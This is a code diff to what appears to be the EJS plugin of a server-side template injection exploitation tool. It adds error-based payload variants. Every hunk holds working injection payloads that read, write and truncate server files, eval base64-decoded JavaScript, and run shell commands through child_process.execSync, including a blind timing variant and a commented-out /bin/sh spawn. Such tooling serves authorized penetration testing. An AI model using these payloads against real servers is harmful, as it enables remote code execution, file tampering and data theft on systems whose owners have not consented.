@@ -26,6 +26,10 @@ class Ejs(javascript.Javascript):
                 'test_render': f'<%= typeof({rand.randints[0]})+{rand.randints[1]} %>',
                 'test_render_expected': f'number{rand.randints[1]}'
             },
+            'render_error': {
+                'header': """<%=''['x'][({header[0]}+{header[1]}).toString()+""",
+                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]%>""",
+            },
             'write': {
                 'write': """<%global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')%>""",
                 'truncate': """<%global.process.mainModule.require('fs').writeFileSync('{path}', '')%>"""
@@ -33,13 +37,22 @@ class Ejs(javascript.Javascript):
             'read': {
                 'read': """<%=global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')%>"""
             },
+            'read_error': {
+                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
+            },
             'md5': {
                 'md5': """<%=global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")%>"""
+            },
+            'md5_error': {
+                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
             },
             'evaluate': {
                 'evaluate': """<%=eval(Buffer('{code_b64p}', 'base64').toString())%>""",
                 'test_os': """global.process.mainModule.require('os').platform()"""
                 #'test_os': """process.platform"""
+            },
+            'evaluate_error': {
+                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
             },
             'execute_blind': {
                 'execute_blind': """<%global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')%>"""
@@ -48,6 +61,9 @@ class Ejs(javascript.Javascript):
             'execute': {
                 'execute': """<%= global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString()) %>"""
                 #'execute': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString()], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
+            },
+            'execute_error': {
+                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
             },
         })
 
